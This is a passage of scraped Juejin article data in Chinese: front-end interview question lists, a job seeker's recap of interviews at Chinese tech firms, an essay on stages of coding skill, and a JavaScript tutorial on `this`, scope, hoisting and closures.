data-id=\"heading-4\">技术面的问题</h2>\n<p>一个多小时的面试，问了很多问题，事后稍事整理记录了下来，主要是围绕JavaScript展开。</p>\n<p><strong>JS部分：</strong></p>\n<ol>\n<li>JS是如何实现继承的？</li>\n<li>object的prototype是什么？（接上一个问题）</li>\n<li>JS如何实现数据以及功能的封装。（即类是如何实现的）</li>\n<li>如果一个标签里面包含了10000个image，如何有效地对这10000个image实现事件绑定，比如说click事件。（考察事件冒泡机制）</li>\n<li>假设现在有对象A、B，A对象绑定了S事件，如何对B对象也绑定S事件？（其实不清楚）</li>\n<li>如何实现跨域请求？你知道的有多少种方法？各有什么优缺点？</li>\n<li>当使用隐藏框架实现跨域请求时，如果框架页跟当前页不属于同个父域，是否可以实现跨域？</li>\n<li>如何实现私有变量？说出一种方法即可。</li>\n<li>函数闭包使用得多吗？什么情况下需要使用函数闭包？</li>\n<li>当某个事件发生时，如果获得事件发生的对象。（ff和ie不同）</li>\n<li>当绑定事件时，this指针指向的是？</li>\n<li>当为document绑定事件时，this指针指向的是？</li>\n<li>发送ajax请求有多少个步骤？如何判定发送成功？（readyState和onreadystatechange）</li>\n<li>表示请求成功返回的状态码是多少？你还知道哪些状态码？分别表示什么意思？</li>\n</ol>\n<p><strong>jQuery部分：</strong></p>\n<ol>\n<li>jQuery里如何绑定事件？有多少种方式？</li>\n<li>jQuery绑定事件时，this指针指向的是？（dom对象还是jQuery对象）</li>\n<li>对于页面中暂时不存在的对象，如果进行事件绑定？</li>\n<li>为什么选用jQuery框架（言下之意就是还有哪些其他的框架，各有什么优缺点，即你对比之后选择的原因）</li>\n<li>有没有考虑过jQuery UI？如何对jQuery UI的样式进行定制？</li>\n<li>有没有自己写作jQuery插件（即如何写jQuery插件）</li>\n</ol>\n<p><strong>html+CSS：</strong></p>\n<ol>\n<li>用html+CSS实现这样的布局效果，左栏固定宽度，右栏宽度自适应并填满剩下空间。</li>\n<li>说说<code>&lt;strong&gt;</code>标签和<code>&lt;b&gt;</code>标签的区别，如果让你选择，你会选择使用哪个？</li>\n<li>说说你对对html标签语义化的理解。</li>\n</ol>\n<h2 class=\"heading\" data-id=\"heading-5\">后记：关于二面</h2>\n<p>大约一周后，接到了二面的电话。面试的结果有点出乎意料，那种惊讶，夹杂着莫名其妙的情绪，至今还无法忘怀。</p>\n<p>故事有点长，未完待续。</p>\n</div>"},null,{"title":"16年毕业的前端er在杭州求职ing","avatar":"https://user-gold-cdn.xitu.io/2017/12/18/1606900c1392ea33?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"Neal_yang","create_time":"2018 年 01 月 23 日","tags":["React.js","前端","面试","JavaScript"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><blockquote>\n<p>来杭州也有一两个星期了，这个周末下雨，是在没地去，还是习惯性的打开电脑逛技术论坛，想想也是好久没有更新博文了。。。</p>\n</blockquote>\n<h2 class=\"heading\" data-id=\"heading-0\">背景</h2>\n<p>因为曾经看过一篇文章<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fjawil%2Fblog%2Fissues%2F22\" rel=\"nofollow noopener noreferrer\">面试分享：一年经验初探阿里巴巴前端社招</a>所以来杭州也是带有目标的，网易！如果能有幸加入阿里，也是非常荣幸的。所以面试总是懒懒散散的，大概一天也就面试一家。</p>\n<p>然后我的技术栈大概是react+node，GitHub地址：<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2FNealyang\" rel=\"nofollow noopener noreferrer\">Nealyang</a></p>\n<p>目前的状态是阿里通过了技术面和交叉面，大概下周一总监面+hr面。网易hr面结束了，在等通知，科大讯飞已经拿到offer了，还是比较不错的offer，别的创业公司、上市公司不管是人工智能还是智能家居也都基本拿了offer，但是。。。好吧，还是有着一颗对大厂的夙愿。或许就是大学埋下的吧。</p>\n<p>因为个人比较懒得跑面试，所以很多公司的电面我都接了，但是很多公司的现场面试都没有去，哎呀呀，好吧，我懒~这里我大概回一下所有面试所问到的问题吧，因为之前没想去记录，所以很多我都忘记是哪一家了，索性一不做二不休，直接一股脑回忆下面试题吧。能想起来的我标注下是哪家公司。</p>\n<h2 class=\"heading\" data-id=\"heading-1\">面试 begin</h2>\n<p>大概我是一月分离开的环球网，然后再北京收拾东西总结知识，开始投递简历，大概都是boss直聘和拉钩上面</p>\n<h3 class=\"heading\" data-id=\"heading-2\">HTML &amp; CSS 部分</h3>\n<ul>\n<li>css常用布局</li>\n</ul>\n<p>这个在面试上市公司和创业公司问的比较多。大概我会回答一些盒模型包括怪异盒模型，定位布局，流布局，浮动布局，flex和grid布局，包括还有三栏布局中的圣杯和双飞翼。这些都还比较熟悉，所以问到都还知道。其中flex布局问的比较多，阿里的交叉面还有别的公司有问到子元素的一些属性。</p>\n<ul>\n<li>BFC</li>\n</ul>\n<p>这个滴滴面试的时候有问道（滴滴是破例让我加入流程中的，并且他们还招的技术栈是vue）一般在问清除浮动的时候会说一下</p>\n<ul>\n<li>居中问题</li>\n</ul>\n<p>这个应该是老生常谈的东西了，电话面试的时候有两家问到</p>\n<ul>\n<li>session、cookie、sessionStorage、localStorage等区别</li>\n</ul>\n<p>这个也是上市公司和创业公司问到，大概就是说了下中间的区别，还有会简单说下cookie的属性，以及一些前端安全方面</p>\n<ul>\n<li>px/em/rem的区别</li>\n</ul>\n<p>滴滴电面的时候问的，这个我也知道，大概说了下相对于父元素还是文档来确定大小之类的。</p>\n<ul>\n<li>animation和transiton的相关属性</li>\n</ul>\n<p>这个我也就用了个大概，大概知道的简写位置和属性，当然，阿里一面还问到，为什么动画推荐用c3而不是js，这个问题当时并没有回答好，大概就是从性能上扯了扯，但是什么占用主线程以及浏览器对c3加速都没聊到。然后网易面试也问到了，然后我巴拉巴拉说了下后来查的相关东西。然后网易问了一句，浏览器怎么优化的动画。。。我。。。不知道。</p>\n<ul>\n<li>css编写注意事项</li>\n</ul>\n<p>因为这个在之前团队里面没有明文规定，所以我也没总结过，大概说了下自己编码中的方式，和浏览器查抄的过程。</p>\n<ul>\n<li>css和HTML 问的的确都不是很多，然后还有什么标签，meta和media啥的，大概也就介绍了下，问的都不是很深，我也没有回答的很深。。。因为我HTML CSS真的一般般。</li>\n</ul>\n<h3 class=\"heading\" data-id=\"heading-3\">JavaScript部分</h3>\n<ul>\n<li>JavaScript数据类型分哪些</li>\n</ul>\n<p>这是一个初创公司电面的问题，问的都非常基础，比如css画三角形之类的。别说，之前没准备，还真的忘记了border怎么设置出现直角三角形还是等腰三角形。当然，这个类型还是。。。没得说的</p>\n<ul>\n<li>JavaScript闭包</li>\n</ul>\n<p>这个应该问的都比较多，我之前总结过，以及常用的场景，也结合es6谈了下作用域和单例模式谈了下</p>\n<ul>\n<li>前端跨域</li>\n</ul>\n<p>这个我基本都知道，之前有在掘金上总结过，这个很多公司又问道，包括阿里、网易一面。一般方式我都知道，具体展开会把CORS跨域，heade信息字段都说了一遍。也不难</p>\n<ul>\n<li>JavaScript继承</li>\n</ul>\n<p>这个我之前也总结过相关文章，网易的一面第二个面试官问了，我大概从原型继承、构造函数继承、组合继承、寄生组合继承优缺点和实现方式都说了下，还有es6的实现方式。一般这样就回答差不多了。后来网易还接着问，es5如何实现super关键字。看过babel转换后代码，但是这个。。真的忘记看了。大概说了下自己的实现思路，也就是装饰着模式。然后也就浑过这题了。</p>\n<ul>\n<li>JavaScript的节流和防抖</li>\n</ul>\n<p>滴滴一面问到了，阿里交叉面的时候聊业务场景的时候，也有问到。之前看过文章，自己项目中也用过，所以大概知道些</p>\n<ul>\n<li>JavaScript的事件</li>\n</ul>\n<p>阿里交叉面问到的js事件执行机制。我大概谈了下event loop，microtask，task queue。然后事件委托、捕获、冒泡、目标阶段大概谈了下，也顺道谈了下target和currentTarget。</p>\n<ul>\n<li>ajax请求方式</li>\n</ul>\n<p>因该算是考察基础功吧，谈了下XMLHTTPRequest的过程，readyState的几种类型和代表的意思。以及浏览器兼容性的处理方案。</p>\n<ul>\n<li>js判断数据类型的方法</li>\n</ul>\n<p>貌似有两家公司问到，大概说了下typeof、instanceof、constructor、prototype等判断方式，注意事项以及优缺点。应该回答的还可以</p>\n<ul>\n<li>函数声明和变量声明</li>\n</ul>\n<p>这个大概我也知道，还说了下es6的相关东西</p>\n<ul>\n<li>this指向的问题</li>\n</ul>\n<p>这个我也总结相关文章，大概说了下四种绑定规则，还说下new的执行过程以及箭头函数注意事项</p>\n<ul>\n<li>\n<p>面向对象的理解\n滴滴一面问的，大概说了下理解以及实现，从封装、继承和多态上说了下es5和es6的实现方式</p>\n</li>\n<li>\n<p>对于js这门语言你认为怎么样</p>\n</li>\n</ul>\n<p>哇，这个问题问的真的大。有看过《JavaScript语言精粹》，大概说了哪些弱类型语言通病，因为之前搞过Java，所以综合对比了下，同时也说了这些诟病怎么解决。应该会的面试官还是挺满意的</p>\n<ul>\n<li>es6相关知识点</li>\n</ul>\n<p>这个应该回答的都不是很深入，大概我都用过，promise的实现方式也研究过，但是不记得哪一家公司问到generator的怎么实现的。大概从iterator上简单说了自己的方案，然后说没看过。然后对于别的其实问的不是很多。基本套路就是es6了解过吗？用过哪些语法。后面具体可能会说下哪一个新特性的实现方式或者转向babel、webpack的相关面试。</p>\n<h3 class=\"heading\" data-id=\"heading-4\">React部分</h3>\n<ul>\n<li>react部分必考的肯定有生命周期</li>\n</ul>\n<p>这里我大概说了下每一个生命周期，es5、es6的两种书写方式，以及每一个生命周期我们一般用来做些什么操作</p>\n<ul>\n<li>setState是异步的还是同步的</li>\n</ul>\n<p>阿里一面的时候问到的，我大概说了两种setState设置方式，以及表现为同步的那种设置方式展开说了下</p>\n<ul>\n<li>子组件和父组件componentDidMount哪一个先执行</li>\n</ul>\n<p>这个也大概从生命周期分期了下。话说我到现在还不知道自己回答的对不对，技友们，你们觉得呢？</p>\n<ul>\n<li>redux的一般流程</li>\n</ul>\n<p>这个我比较熟悉，一带说了下所有的技术栈，以及react-redux的原理、高阶组件、以及redux-saga的实现原理。（逮住会的，都啪啪啪说出来，自己掌握点节奏。但是要适当，比如问到我es6，我啦啦啦说了一二十分钟，一般面试官会有点不耐烦。所以视情况而定）</p>\n<ul>\n<li>如何设计一些组件，原则是什么，你写过什么自豪或者眼前一亮的组件</li>\n</ul>\n<p>阿里一面以及一家上市公司也闻到过这类似的问题，大概从组合、复用、重复、测试、维护等方面说了下</p>\n<ul>\n<li>a组件在b组件内，c组件在a组件内，如何让他渲染出来，a组件和c组件同级</li>\n</ul>\n<p>阿里面试的时候问到的问题，想了一会，说了不会。后来查了下，大概可以通过react16中返回不带包裹元素的组件来实现。因为和阿里一面面试官后来聊得比较开心，加了微信，还斗胆为了下他，他说还有曲线救国的实现方式</p>\n<ul>\n<li>react组件的优化</li>\n</ul>\n<p>从pureRenderMixin、ShouldComponentUpdate等方面说了下，以及组件的设计和木偶组建的函数编写方式说了下</p>\n<ul>\n<li>react组件的通信</li>\n</ul>\n<p>这个大搞几种方式也都说了下，prop，context（顺道扯了react-redux的context实现方式）、redux甚至广播都说了一遍</p>\n<ul>\n<li>react 的virtual dom和diff算法的实现方式</li>\n</ul>\n<p>阿里交叉面问的，直接说实现方式源码没有看过，但是大概说了下原理和步骤，具体代码怎么写的不知道。</p>\n<ul>\n<li>MVC、MVVM了解么，数据双向绑定和单向绑定实现方式</li>\n</ul>\n<p>滴滴一面问的，实现方式还是说了不知道，然后说了下MVC和MVVM的设计模式，因为之前用过angular1，大概就说下脏检查步骤以及view-model的作用</p>\n<ul>\n<li>react-router实现方式，单页面应用相关东西</li>\n</ul>\n<p>大概说了下react-router的一般使用方式，以及没有使用react-router的时候如何利用h5 的history API来实现路由跳转等。</p>\n<ul>\n<li>react的ssr了解么？大概怎么实现</li>\n</ul>\n<p>阿里的一面问的，在github上写过demo，但是没有用过别的第三方库，这里我就大概说了下webpack的配置项以及大概的实现思路和注意事项。</p>\n<ul>\n<li>react大概也就问了这么写，别的就是具体的业务场景改怎么写代码怎么分析，比较不大众，这里我就我细说了。其实也就考验你的项目经验吧。当然，还有一些react Native的面试题，比如常用组件，和原生如何通信之类的，这些就有赞问的多，但是因为RN玩的不是很透彻，所以对于交互原理都不是很明白。</li>\n</ul>\n<h3 class=\"heading\" data-id=\"heading-5\">浏览器</h3>\n<ul>\n<li>http三次握手后拿到HTML，浏览器怎么加载</li>\n</ul>\n<p>阿里的一面问的问题，这个我之前在环球做过相关技术分享，所以大概都知道，从过程到不同内核差异（差异部分简单提了下）说了下dom、CSSDom以及paint等过程。然后面试官接着问如何防止repaint和reflow。大概从引起repaint和reflow等操作上说了下避免。网易的一面也问到了repaint和reflow。</p>\n<ul>\n<li>前端优化一般都做哪些</li>\n</ul>\n<p>这个之前总结过，雅虎的军规啥的。以及首屏优化。然后面试跟了些预加载http head信息相关的，这个没怎么看，回答的不是很好</p>\n<ul>\n<li>浏览器缓存</li>\n</ul>\n<p>这个我也做了相关的技术分享，也看过《图解http》大概从http 1.0和1.1都说了下，其中有一家公司问到200 From cache和200 ok区别（有赞），这个还真的忽略了，后来查了下大概了解了。其实也就是强缓存</p>\n<ul>\n<li>http常见状态码</li>\n</ul>\n<p>从100~500 大概也说了十几种。其实也就是《图解http》中的东西，当时还刻意背了下</p>\n<ul>\n<li>http2.0相关</li>\n</ul>\n<p>网易一面问题，说了下2.0的采用二进制格式、多路复用、报文头压缩、服务器主动推送还扯了websocket的相关内容<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fjuejin.im%2Fpost%2F5a4e6a43f265da3e303c4787\" rel=\"nofollow noopener noreferrer\">WebSocket：5分钟从入门到精通</a>。然后网易接着问，报文头怎么压缩的？我。。。？？不知道。。。然后大概也问了下https的TLS/SSL,之前看过漫画的htts的相关东西，大概说了下漫画里面的故事~</p>\n<ul>\n<li>post、get区别</li>\n</ul>\n<p>这个回答的不是很好，也是一个大厂问的题目，我回答的都是表象。后来我看了一篇文章，大概知道了。<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fmp.weixin.qq.com%2Fs%3F__biz%3DMzI3NzIzMzg3Mw%3D%3D%26mid%3D100000054%26idx%3D1%26sn%3D71f6c214f3833d9ca20b9f7dcd9d33e4%23rd\" rel=\"nofollow noopener noreferrer\">99%的人都理解错了HTTP中GET与POST的区别</a></p>\n<ul>\n<li>别的我也不记得了，回头想起来在来补充吧</li>\n</ul>\n<h3 class=\"heading\" data-id=\"heading-6\">构建工具</h3>\n<ul>\n<li>编写过webpack的扩展嘛，Plugin或者loader</li>\n</ul>\n<p>这个我看过一本书《深入浅出webpack》，所以基本都能回答上来。包括原理和编写loader、Plugin注意事项。当然，我自己没有写过。。。<a target=\"_blank\" href=\"https://link.juejin.im?target=http%3A%2F%2Fwebpack.wuhaolin.cn%2F\" rel=\"nofollow noopener noreferrer\">《深入浅出webpack》</a></p>\n<ul>\n<li>babel 问的不多，但是我也准备了，包括每一个包的作用和内部转换过程，不记得哪家公司问了，大概我也就说了下babel转换的过程。</li>\n</ul>\n<h2 class=\"heading\" data-id=\"heading-7\">结束语</h2>\n<p>下周起阿里终面，网易等通知。别的公司基本offer也都拿到了，但是大厂毕竟大厂，基本拿到的offer都过期了。。。并没有办法，毕竟有个大厂梦。好吧，其实还是挺幸运的，阿里用人部门主管leader和一面面试官，加了微信都聊得挺开心的。还感谢主管GitHub follow了我。期望加入~</p>\n<p>基本想到的就是就这么些，后面如果想到再来补充吧。</p>\n<p>ps：最近掘金 关注涨的有点多，也不知道为啥，最近也没有怎么学习，所以就匆匆忙忙整理这些不知道是不是干活的干活。如果整理的不好，还望见谅。后续结束求职经历，在来细细雕琢。</p>\n</div>"},{"title":"写代码水平的几个发展阶段","avatar":"https://user-gold-cdn.xitu.io/2017/9/25/8c2308ac1d83bf3344016184b44d901c?imageView2/1/w/100/h/100/q/85/format/webp/interlace/1","author":"黄轶","create_time":"2018 年 01 月 12 日","tags":["程序员","开源","算法","全栈"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><h2 class=\"heading\" data-id=\"heading-0\">背景</h2>\n<p>这篇文章非我原创，是我在公司内部平台拜读了我们公司的架构师——<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fhuandu\" rel=\"nofollow noopener noreferrer\">杜欢</a>最近写的一篇文章，也很感同身受，觉得非常值得分享。</p>\n<p>杜欢在我的眼中是一名非常出色的全栈工程师，他拥有 10 年以上的开发经验，无论从技术深度和广度上都有很不错的造诣，即使已经做到了部门技术总监的位置，还能始终保持着对技术的热爱和追求，令我非常佩服。他根据多年的经验，总结出程序员写代码的水平分为以下几个发展阶段：</p>\n<h2 class=\"heading\" data-id=\"heading-1\">懵懂</h2>\n<p>刚开始学习编程或学习一种新技术的时候，会有种雾里看花的感觉，似懂非懂，就算记住了也不会用。要突破这个阶段的方法就是“练习”，通过各种项目让自己熟练起来，做到任何一个不太难的业务需求可以快速想到解决方案并且开始动手实现。</p>\n<h2 class=\"heading\" data-id=\"heading-2\">会用</h2>\n<p>通过 google、stackoverflow、各种专业社区、各种文章等渠道，自己慢慢会发现更大的世界并对这个世界中各种技术产生了兴趣，理解一个简单的新技术不再成为自己的瓶颈，自己慢慢可以驾驭非常多的工具、组件、库、设计模式、算法、语言等，主动不断扩大自己的视野，尝试在项目中使用各种新东西，对引入一个新技术开始变得非常兴奋，最终可以做到快速的吸收并理解一个新技术的用法，也知道什么时候该用什么技术。</p>\n<h2 class=\"heading\" data-id=\"heading-3\">会看</h2>\n<p>出于某些机缘，比如遇到了一个比较难以解决的 bug，开始深入阅读某种日常用到的技术的内部原理，从而开始发现更多自己所不知道的东西，并开始对各种技术的背后实现产生兴趣，慢慢建立起一个相对完备的知识体系，对某个领域的所有的相关技术都能够如数家珍一般的讲出来，第一次开始有一种“时间不够用”的无力感，面对浩如繁星的开源/闭源代码量深深感觉到自己的渺小，越来越不愿意去轻易重造一个轮子，真正懂得怎么去评估一个开源技术的好坏。</p>\n<h2 class=\"heading\" data-id=\"heading-4\">会写</h2>\n<p>突然有一天，在钻研某种技术的时候发现一种突破性的思路，并且通过谨慎调研后发现确实有实现出来的必要，于是就将大量的时间投入在实现理想的过程中去，并且主动的用各种技术来提升自己的工作效率，最终拿出来的成果确实如预计一般站在了业界的最前沿。</p>\n<h2 class=\"heading\" data-id=\"heading-5\">会想</h2>\n<p>当自己已经站在了业界这个领域的最前沿，除了继续动手实现最核心的代码，还找到了未来三年的发展方向，并且第一次勇敢的自我否定抛弃了自己原先的想法。</p>\n<h2 class=\"heading\" data-id=\"heading-6\">总结</h2>\n<p>如果长期不写代码一定会让自己的水平下降，如果长期只做当前级别以下的事情也可能会退化。绝对不是说“会想”了就可以每天冥想、指点江山，自己不动手就很容易被后来者超越并且开始固步自封，从“会想”变成自以为是，退化到之前的阶段。</p>\n<p>杜欢认为他目前一直停留在“会写”的阶段，甚至有可能已经退化到了“会看”阶段，距离“会想”还非常的远。我看完后感觉自己在“会看”和“会写”中徘徊，也远没达到“会想”的阶段。</p>\n<p>非常多的程序员停留在“会用”的阶段，满足于能够解决问题，还没能看的更深更远。在“会用”的阶段很容易产生一种无所不能的错觉，觉得已经没什么功能实现不了，开始重复造一些并不怎么好的轮子，造轮子之前甚至都没有去仔细研究过业界最先进的技术实现细节，如果一直处在这种错觉之中，基本上就很难再成长了。其实这种现象在大公司中也常出现，很多程序员仅止步于写代码的初级阶段，还是非常可惜的。</p>\n<p>在进入“会看”之后会有一段非常长的痛苦期，这段时间里会非常感觉一个人的渺小，既没有时间去穷尽所有技术细节，也没有能力去找到前人没有尝试过的突破性创新，简直是一种煎熬。有不少业界大牛就停留在这个阶段，迷失在各种细节之中，成为一个知识丰富但缺乏创造力的人。</p>\n<p>我最近认识了一些新朋友，是一些热爱折腾的年轻人@<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2Fdoodlewind\" rel=\"nofollow noopener noreferrer\">doodlewind</a>、@<a target=\"_blank\" href=\"https://link.juejin.im?target=https%3A%2F%2Fgithub.com%2FLucifier129\" rel=\"nofollow noopener noreferrer\">工业聚</a>，我关注了他们的一些动态，并在和他们交流技术的时候明显感觉到技术视野和思路被打开，非常看好他们。虽然我现在在公司也做了一些技术管理的工作，时间精力被分配了一些，但也希望自己也能一直保持着持续的技术学习，在技术这条路上继续深耕。</p>\n<p>希望所有程序员都能笔耕不辍，向着下一个阶段进发。</p>\n</div>"},{"title":"前端面试之js相关问题（一）","avatar":"https://avatars.githubusercontent.com/u/1239329?v=3","author":"前端杂货铺","create_time":"2018 年 01 月 09 日","tags":["前端","JavaScript","面试","编译器"],"content":"<div data-v-13f76525=\"\" data-v-3f216172=\"\" class=\"entry-content post-content juejin-image-viewer__container\"><p>最近我也是经历过面试别人和去面试的人了，总结几个常被提及的面试问题，做一下解答和备忘。</p><h3 data-id=\"heading-0\">JavaScript 中 this 是如何工作的 ？</h3><p>先来看看这个题目：</p><div><pre class=\"hljs bash\"><code>var x = 0;\nvar foo = {\n    x:1,\n    bar:{\n    x:2,\n    baz: <span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n       console.log(this.x)\n     }\n    }\n}\n\nvar a = foo.bar.baz\nfoo.bar.baz() // 2\na() //0\n</code></pre></div><ul><li>this 永远指向函数运行时所在的对象，而不是函数创建时所在的对象</li><li>匿名函数和不处于任何对象中的函数，This指向window</li><li>call, apply, with指的This是谁就是谁。</li><li>普通函数调用，函数被谁调用，This就指向谁</li></ul><p>上面的例子中，baz被bar调用所以指向的指bar. a 运行时所在的对象是 window,所以指向的是window。</p><h3 data-id=\"heading-1\">作用域链?</h3><p><b>理解执行环境和上下文</b></p><p>函数调用都有与之相关的作用域和上下文。从根本上说，作用域是基于函数(function-based)而上下文是基于对象(object-based)。换句话说，作用域是和每次函数调用时变量的访问有关，并且每次调用都是独立的。上下文总是关键字 this 的值，是调用当前可执行代码的对象的引用。</p><p>执行上下文分有<b>global</b>、<b>function</b>、<b>eval</b>，一个函数可以产生无数个执行上下文，一系列的执行上下文从逻辑上形成了 执行上下文栈，栈底总是全局上下文，栈顶是当前（活动的）执行上下文。</p><p>执行上下文三属性：this指针，变量对象（数据作用域），作用域链</p><p>作用域链 即：一变量在自己的作用域中没有，那么它会寻找父级的，直到最顶层。过程如下：</p><ul><li>任何在执行上下文时刻的作用域都由作用域链来实现</li><li>在一个函数被定义的时候, 会将它定义时刻的scope chain链接到这个函数对象的[[scope]]属性</li><li>在一个函数对象被调用的时候，会创建一个活动对象(也就是一个对象), 然后对于每一个函数的形参，都命名为该活动对象的命名属性, 然后将这个活动对象做为此时的作用域链(scope chain)最前端, 并将这个函数对象的[[scope]]加入到scope chain中.<br></li></ul><p>上面的文字大家可以好好琢磨一下，可以更好的理解函数作用域。<br></p><h3 data-id=\"heading-2\">函数声明提升和变量声明提升(Hoisting) ？</h3><p>我们先来了解js编译器在执行代码的过程：<br>以执行一段function代码为例：<br>第一步：创建可执行上下文（以下简称为EC），压入当前的EC栈中。EC中包括了以下信息：</p><ul><li>词法环境（=环境记录项（保存变量、函数声明和形参）+ 外部词法环境（function的[[scope]]属性，作用域链的本质））</li><li>this的指针</li><li>变量环境（与环境记录项的值相同，但不再发生变动。）</li></ul><p>第二步：收集<b>函数声明</b>、<b>变量声明</b>和<b>形参</b>，保存在环境记录项内。这个收集的过程，就是一般所谓的声明提升现象的本质。如果发现了重复的标识符，则<b>优先级</b>为<b>函数声明</b> 、<b>形参</b> 、<b>变量声明</b>（优先级低的会被无视）。</p><p>第三步：开始执行代码，环境记录项内没有的标识符会根据作用域链查找标识符对应的值，环境记录项亦有可能因赋值语句而被修改。</p><p>第四步：函数执行完毕，EC栈被弹出、销毁。</p><p>好了，第二步说的很清楚了 声明提升(Hoisting)现象就是在收集函数、变量声明和形参的过程会根据函数声明、形参、变量声明的顺序优先级来收集。</p><p>例子：<br></p><div><pre class=\"hljs bash\"><code>var a = 1;  \n<span class=\"hljs-keyword\">function</span> <span class=\"hljs-function\"><span class=\"hljs-title\">b</span></span>() {  \n    a = 10;  \n    <span class=\"hljs-built_in\">return</span>;  \n    <span class=\"hljs-keyword\">function</span> <span class=\"hljs-function\"><span class=\"hljs-title\">a</span></span>() {}  \n}  \nb();  \nconsole.log(a); \n// 输出1 由于函数声明提升，b内的实际是这样：\n// <span class=\"hljs-keyword\">function</span> <span class=\"hljs-function\"><span class=\"hljs-title\">b</span></span>() {  \n//    <span class=\"hljs-keyword\">function</span> <span class=\"hljs-function\"><span class=\"hljs-title\">a</span></span>() {}; 这里是函数声明提升\n//    a = 10;  \n//    <span class=\"hljs-built_in\">return</span>;  \n//    <span class=\"hljs-keyword\">function</span> <span class=\"hljs-function\"><span class=\"hljs-title\">a</span></span>() {}  \n// }\n</code></pre></div>理解了吗？<blockquote>勘误：谢谢github上有同学的指正<a href=\"https://link.juejin.im?target=https%3A%2F%2Flink.zhihu.com%2F%3Ftarget%3Dhttps%253A%2F%2Fgithub.com%2Fstephenzhao%2Fhexo-theme-damon%2Fissues%2F1\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">关于博客中的一个问题 · Issue #1 · stephenzhao/hexo-theme-damon</a>，上面的正确执行应该为先进行预编译，所以先执行function a(){}，然后会进行对a的赋值操作。</blockquote><div><pre class=\"hljs bash\"><code>//正确的顺序应该为：\n// <span class=\"hljs-keyword\">function</span> <span class=\"hljs-function\"><span class=\"hljs-title\">b</span></span>() {  \n//    <span class=\"hljs-keyword\">function</span> <span class=\"hljs-function\"><span class=\"hljs-title\">a</span></span>() {}  \n//    a = 10;  \n//    <span class=\"hljs-built_in\">return</span>;  \n// }\n</code></pre></div><br><h3 data-id=\"heading-3\">什么是闭包，如何使用它，为什么要使用它？</h3><p>还是上面的题目，做个变形。<br></p><div><pre class=\"hljs bash\"><code>var x = 0;\nvar foo = {\n    x:1,\n    bar:<span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n        console.log(this.x);\n        var that = this;\n        <span class=\"hljs-built_in\">return</span> <span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n           console.log(this.x)\n           console.log(that.x)\n        }\n    }\n}\n\n\nfoo.bar()       // 1\nfoo.bar()()     // this: 0, that: 1\n</code></pre></div><p>上面的例子中ba'r里面返回了一个匿名函数，这个匿名函数可以在外部被调用即：foo.bar()() 读取到了bar的执行上下文的变量对象 that，这个函数就形成了一个闭包。<br></p><p>好了，我们理解了上面的套路，下面来解释闭包就好理解了。</p><p>闭包就是能够读取其它函数内部变量的函数</p><p>在Javascript语言中，只有函数内部的子函数才能读取局部变量，因此可以把闭包简单理解成“定义在一个函数内部的函数”</p><div><pre class=\"hljs bash\"><code>var x = 0;\nvar bar:<span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n        var n = 999;\n        <span class=\"hljs-built_in\">return</span> <span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n           <span class=\"hljs-built_in\">return</span> n;\n        }\n    }\nvar outer = bar();\nouter() // 999\n</code></pre></div><p>用途：</p><ol><li>读取函数内部的变量</li><li>让这些变量的值始终保持在内存中</li></ol><p>我们修改一下上面的代码</p><div><pre class=\"hljs bash\"><code>var add;\nvar bar = <span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n        var n = 999;\n        add = <span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n            n += 1;\n        }\n        <span class=\"hljs-built_in\">return</span> <span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n           <span class=\"hljs-built_in\">return</span> n;\n        }\n    }\nvar outer = bar();\nouter() // 999 \nadd();\nouter(); // 1000\n</code></pre></div><p>说明，n一直保存在内存当中，而没有在bar()执行完成之后被销毁；<br>原因：<br>bar里面的匿名函数被赋值给了outer，这个导致在outer没有被销毁的时候，该匿名函数一直存在内存当中，而匿名函数的存在依赖于bar，所以bar需要使用都在内存当中，所以bar并不会在调用结束后呗垃圾回收机制给收回。</p><p>而上面的add接受的也是一个匿名函数，该匿名函数本身也是闭包，所以也可以在外部操作里面的变量。</p><p>注意点</p><ol><li>会导致内存泄漏，慎用</li><li>闭包会修改内部变量的值，所以在使用闭包作为对象的公用方法时要谨慎。<br>闭包的一个应用，单例模式</li></ol><blockquote><p>单例模式的定义是产生一个类的唯一实例</p></blockquote><p>单例模式在js中经常会遇到，比如 var a = {}; 其实就是一个单例子。</p><p>但是我们写一个更有意义的单例：</p><div><pre class=\"hljs bash\"><code>var singleton = <span class=\"hljs-keyword\">function</span>( fn ){\n    var result;\n    <span class=\"hljs-built_in\">return</span> <span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span>(){\n        <span class=\"hljs-built_in\">return</span> result || ( result = fn .apply( this, arguments ) );\n    }\n}\n</code></pre></div><p>更简洁一点的：<br></p><div><pre class=\"hljs bash\"><code>var singleton = (<span class=\"hljs-function\"><span class=\"hljs-title\">function</span></span> () {\n    var instance;\n    <span class=\"hljs-built_in\">return</span> <span class=\"hljs-keyword\">function</span> (object) {\n        <span class=\"hljs-keyword\">if</span>(!instance){\n            instance = new object();\n        }\n        <span class=\"hljs-built_in\">return</span> instance;\n    }\n    })();\n</code></pre></div><p>又是半夜，这两天在看里约奥运会的比赛，林丹和李宗伟的那场比赛是今年看过的经次于nba总决赛最后一场的精彩程度。一个伟大的英雄，需要另一个伟大的对手来成就，感谢林丹，感谢李宗伟世界会记住你们。晚安。</p><p>接下来的文章讲解一些关于<a 